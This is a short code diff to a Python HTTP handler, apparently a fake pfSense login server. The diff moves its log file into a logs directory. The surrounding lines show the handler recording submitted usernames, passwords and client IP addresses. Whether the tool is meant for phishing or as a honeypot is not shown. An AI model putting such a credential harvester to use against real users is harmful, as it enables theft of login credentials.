@@ -40,7 +40,7 @@ class pfSenseHandler(BaseHTTPRequestHandler):
         parsed_data = urllib.parse.parse_qs(post_data.decode())
         
         # Log the data
-        with open('log.txt', 'a') as log_file:
+        with open('./logs/log.txt', 'a') as log_file:
             username = parsed_data.get('username', [''])[0]
             password = parsed_data.get('password', [''])[0]
             ip = self.client_address[0]
